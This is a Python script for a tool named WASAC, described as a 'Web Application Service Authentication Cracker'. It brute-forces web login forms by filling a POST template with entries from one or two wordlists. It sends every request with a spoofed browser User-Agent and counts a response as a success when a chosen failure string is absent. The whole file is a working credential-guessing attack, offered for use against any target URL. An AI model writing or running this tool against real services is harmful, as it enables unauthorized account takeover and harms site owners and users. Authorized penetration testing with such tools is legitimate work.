# Copyright © Gr3yPh 2024. All rights reserved.

import argparse
import requests
import sys
import os
import shutil

# ANSI 转义序列
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    WHITE = '\033[97m'

def clear_screen():
    # 清屏处理
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text):
    # 居中显示文本
    term_width = shutil.get_terminal_size().columns
    return text.center(term_width)

def print_banner():
    
    print(center_text(Colors.GREEN + 'WASAC'))
    print(center_text('Web Application Service Authentication Cracker v1.0'))
    print(center_text('Copyright (c) Gr3yPh 2024'))
    print(center_text('GitHub: http://github.com/Gr3yPh/wasac'))  # 添加 GitHub 地址
    print()
    # 将字体颜色切换为白色
    print(Colors.WHITE, end='')

def load_payloads(payload_file):
    try:
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f]
    except IOError:
        print(center_text(Colors.RED + '[-] Error opening file: ' + Colors.WHITE + f'{payload_file}. Please check if the file is valid.'))
        sys.exit(1)

def send_request(target, data, headers):
    try:
        return requests.post(target, headers=headers, data=data, timeout=10)
    except requests.RequestException:
        print(center_text(Colors.RED + '[-] Error connecting to the target. Check the Internet connections and try again.'))
        sys.exit(1)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='A tool to crack web applications\' service authentication')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target URL')
    parser.add_argument('--payload-count', type=int, choices=[1, 2], required=True, help='Payload count (1 or 2)')
    parser.add_argument('-p1', '--payload1', type=str, help='The path of the first payload\'s dictionary')
    parser.add_argument('-p2', '--payload2', type=str, help='The path of the second payload\'s dictionary')
    parser.add_argument('-f', '--format', type=str, required=True, help='POST Format (replace payload position with ^P1^ and ^P2^)')
    parser.add_argument('-F', '--First', action='store_true', help='Stop cracking as soon as the first valid payload is found')
    parser.add_argument('--grep-match', type=str, help='Flag items that contain this value', default='failed')
    parser.add_argument('-o', '--output', type=str, help='Output file to save detailed logs')
    args = parser.parse_args()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    count = success_count = fail_count = 0
    successful_payloads = []

    # 记录详细日志
    log_file = None
    if args.output:
        log_file = open(args.output, 'a')

    # 输出目标和加载的 payload 数量
    print(center_text(f'Target URL: {args.target}'))
    print(center_text(f'Loading Payloads...'))
    
    if args.payload_count == 1:
        payloads1 = load_payloads(args.payload1)
        print(center_text(f'Loaded {len(payloads1)} payloads from {args.payload1}'))
        print(center_text('-' * 80))

        print(center_text(f'{"Payload":<30} | {"Response Length":<20} | {"Status":<10}'))
        print(center_text('-' * 80))

        for payload1 in payloads1:
            count += 1
            data = args.format.replace('^P1^', payload1)
            response = send_request(args.target, data, headers)
            is_failed = args.grep_match.encode() in response.content
            
            if is_failed:
                log_entry = f'Payload: {payload1} | Request Data: {data} | Response: {response.text}\n'
                if log_file:
                    log_file.write(log_entry)
                print(center_text(f'{Colors.WHITE}{payload1:<30} | {len(response.text):<20} | {Colors.RED}Failed{Colors.RESET}'))
                fail_count += 1
            else:
                log_entry = f'Payload: {payload1} | Request Data: {data} | Response: {response.text}\n'
                if log_file:
                    log_file.write(log_entry)
                print(center_text(f'{Colors.WHITE}{payload1:<30} | {len(response.text):<20} | {Colors.GREEN}Success{Colors.RESET}'))
                success_count += 1
                successful_payloads.append(payload1)
                if args.First:
                    break

    elif args.payload_count == 2:
        payloads1 = load_payloads(args.payload1)
        payloads2 = load_payloads(args.payload2)
        print(center_text(f'Loaded {len(payloads1)} payloads from {args.payload1} and {len(payloads2)} payloads from {args.payload2}'))
        print(center_text('-' * 80))

        print(center_text(f'{"Payload 1":<30} | {"Payload 2":<30} | {"Response Length":<20} | {"Status":<10}'))
        print(center_text('-' * 80))

        for payload1 in payloads1:
            for payload2 in payloads2:
                count += 1
                data = args.format.replace('^P1^', payload1).replace('^P2^', payload2)
                response = send_request(args.target, data, headers)
                is_failed = args.grep_match.encode() in response.content
                
                if is_failed:
                    log_entry = f'Payload 1: {payload1} | Payload 2: {payload2} | Request Data: {data} | Response: {response.text}\n'
                    if log_file:
                        log_file.write(log_entry)
                    print(center_text(f'{Colors.WHITE}{payload1:<30} | {Colors.WHITE}{payload2:<30} | {len(response.text):<20} | {Colors.RED}Failed{Colors.RESET}'))
                    fail_count += 1
                else:
                    log_entry = f'Payload 1: {payload1} | Payload 2: {payload2} | Request Data: {data} | Response: {response.text}\n'
                    if log_file:
                        log_file.write(log_entry)
                    print(center_text(f'{Colors.WHITE}{payload1:<30} | {Colors.WHITE}{payload2:<30} | {len(response.text):<20} | {Colors.GREEN}Success{Colors.RESET}'))
                    success_count += 1
                    successful_payloads.append((payload1, payload2))
                    if args.First:
                        break

    print(center_text(Colors.YELLOW + '\n' + '*' * 25 + '\n'))
    print(center_text(Colors.GREEN + '[+] Finished.'))
    print(center_text(f'[*] Total {count}'))
    print(center_text(f'[*] Success count {success_count}'))
    print(center_text(f'[*] Failure count {fail_count}'))
    
    print(center_text(Colors.WHITE + '\n[*] Successful Payloads: ' + ', '.join(map(str, successful_payloads))))

    if log_file:
        log_file.close()

if __name__ == "__main__":
    main()